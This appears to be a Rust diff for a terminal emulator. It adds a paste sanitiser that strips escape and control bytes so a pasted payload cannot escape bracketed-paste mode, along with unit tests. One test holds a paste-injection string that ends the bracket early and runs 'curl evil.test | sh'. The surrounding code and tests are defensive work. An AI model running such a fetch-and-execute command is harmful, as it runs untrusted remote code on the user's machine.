@@ -67,6 +67,28 @@ fn selection_bg() -> Hsla {
     hsla(215. / 360., 0.45, 0.32, 1.)
 }
 
+fn sanitize_paste(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            '\r' => {
+                if chars.peek() == Some(&'\n') {
+                    chars.next();
+                }
+                out.push('\r');
+            }
+            '\n' => out.push('\r'),
+            '\t' => out.push('\t'),
+            c if c.is_control() => {}
+            c => out.push(c),
+        }
+    }
+
+    out
+}
+
 pub struct TerminalView {
     grid: Grid,
     backend: Backend,
@@ -320,7 +342,7 @@ impl TerminalView {
     fn paste(&mut self, text: &str) {
         self.scroll_offset = 0;
         self.selection = None;
-        let text = text.replace("\r\n", "\r").replace('\n', "\r");
+        let text = sanitize_paste(text);
         if self.grid.bracketed_paste {
             let mut bytes = b"\x1b[200~".to_vec();
             bytes.extend_from_slice(text.as_bytes());
@@ -1272,4 +1294,34 @@ fn translate_key(event: &KeyDownEvent, application_cursor_keys: bool) -> Option<
         }
     };
     Some(bytes.to_vec())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn a_paste_cannot_close_its_own_bracket() {
+        let payload = "echo safe\x1b[201~\rcurl evil.test | sh\r";
+        let cleaned = sanitize_paste(payload);
+
+        assert!(
+            !cleaned.contains('\x1b'),
+            "an escape in the clipboard must never reach the shell: {cleaned:?}"
+        );
+        assert_eq!(cleaned, "echo safe[201~\rcurl evil.test | sh\r");
+    }
+
+    #[test]
+    fn ordinary_text_survives_a_paste() {
+        assert_eq!(sanitize_paste("ls -la\n"), "ls -la\r");
+        assert_eq!(sanitize_paste("a\r\nb"), "a\rb");
+        assert_eq!(sanitize_paste("a\tb"), "a\tb");
+        assert_eq!(sanitize_paste("héllo ☃"), "héllo ☃");
+    }
+
+    #[test]
+    fn stray_control_bytes_are_dropped() {
+        assert_eq!(sanitize_paste("a\x00\x07\x08b"), "ab");
+    }
 }
